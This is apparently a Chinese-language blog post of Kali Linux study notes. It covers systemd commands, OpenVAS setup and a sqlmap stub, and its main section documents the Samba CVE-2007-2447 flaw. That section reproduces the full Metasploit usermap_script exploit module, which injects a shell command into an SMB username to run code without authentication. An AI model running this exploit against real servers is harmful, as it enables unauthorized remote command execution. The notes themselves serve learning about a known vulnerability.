---
layout: post
title: "kali-linux-note"
date: 2017-10-17 11:56:10
image: 'kali-Linux-Destop.jpg'
description: 关于学习kali-Linux的笔记
category: '计算机'
tags:
- 计算机技术
twitter_text: 关于学习kali-Linux的笔记
introduction: 关于学习kali-Linux的笔记
color: '4A3341'
author: 夜雨
---

### Systemd

Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。

- 切换至字符界面
  ```sudo systemctl set-default multi-user.target```
- 切换至图形界面
  ```sudo systemctlset-default graphical.target```
- 打开图形界面
  ```sudo init 5```
### Metasploit
#### usermap_script 漏洞相关笔记
- usermap_script：CVE-2007-2447
>利用Samba用户名映射脚本命令执行
>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。 
>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。 
>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名
>模块的位置 exploit/multi/samba/usermap_script
>用户输入未转义的参数作为参数传递到/bin/sh，允许远程命令执行
>此漏洞最初是针对匿名呼叫报告的
> 经过Samba开发者的进一步调查，结果是确定了问题更广泛和影响远程打印机和文件共享管理。 根本原因是传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中。 
> 然而，不同于"username map script"漏洞，远程文件和打印机管理脚本需要经过身份验证的用户会话。
>
> 漏洞的时间线：
>
>  1. 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。
>  2. 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。
>  3. 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。
>  4. 2007年5月10日：向vendor-sec邮件列表发布通知。
>  5. 2007年5月14日：公开漏洞信息。

```ruby
##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# 这个和Python的import还要C的include一样的作用
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
# Metasploit3是从Msf::Exploit::Remote中继承的

    Rank = ExcellentRanking

    include Msf::Exploit::Remote::SMB

    # For our customized version of session_setup_ntlmv1
    CONST = Rex::Proto::SMB::Constants
    CRYPT = Rex::Proto::SMB::Crypt

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Samba "username map script" Command Execution',
            'Description'    => %q{
                    This module exploits a command execution vulerability in Samba
                versions 3.0.20 through 3.0.25rc3 when using the non-default
                "username map script" configuration option. By specifying a username
                containing shell meta characters, attackers can execute arbitrary
                commands.

                No authentication is needed to exploit this vulnerability since
                this option is used to map usernames prior to authentication!
            },
            'Author'         => [ 'jduck' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 10040 $',
            'References'     =>
                [
                    [ 'CVE', '2007-2447' ],
                    [ 'OSVDB', '34700' ],
                    [ 'BID', '23972' ],
                    [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
                    [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
                ],
            'Platform'       => ['unix'],
            'Arch'           => ARCH_CMD,
            'Privileged'     => true, # root or nobody user
            'Payload'        =>
                {
                    'Space'    => 1024,
                    'DisableNops' => true,
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                            # *_perl and *_ruby work if they are installed
                            # mileage may vary from system to system..
                        }
                },
            'Targets'        =>
                [
                    [ "Automatic", { } ]
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => 'May 14 2007'))

        register_options(
            [
                Opt::RPORT(139)
            ], self.class)
    end


    def exploit

        connect

        # lol?
        username = "/=`nohup " + payload.encoded + "`"
        begin
            simple.client.negotiate(false)
            simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
        rescue ::Timeout::Error, XCEPT::LoginError
            # nothing, it either worked or it didn't ;)
        end

        handler
    end

end
```
### OpenVas安装

```shell
sudo apt-get install openvas
sudo openvas-setup
```

安装过程中，会被询问关于redis的问题，选择默认选项来以Unix套接字运行。

即使是有快速的网络连接，openvas-setup 仍需要很长时间来下载和更新所有所需的 CVE、SCAP 定义。

请注意 openvas-setup 的命令输出，密码会在安装过程中生成，并在安装的最后在控制台中打印出来。

验证 openvas 正在运行:

`netstat -tulpn`

在 Kali 中启动 OpenVAS：

`openvas-start`

安装后，你应该可以通过 `https://127.0.0.1:9392` 访问 OpenVAS 的 web 程序了。

接受自签名证书，并使用 openvas-setup 输出的 admin 凭证和密码登录程序。

接受自签名证书后，你应该可以看到登录界面了。

### linux命令之ubuntu 重启网络服务而不需重启
```sudo /etc/init.d/networking restart```

## sqlmap学习笔记

```shell
sqlmap -u URL [options]
```

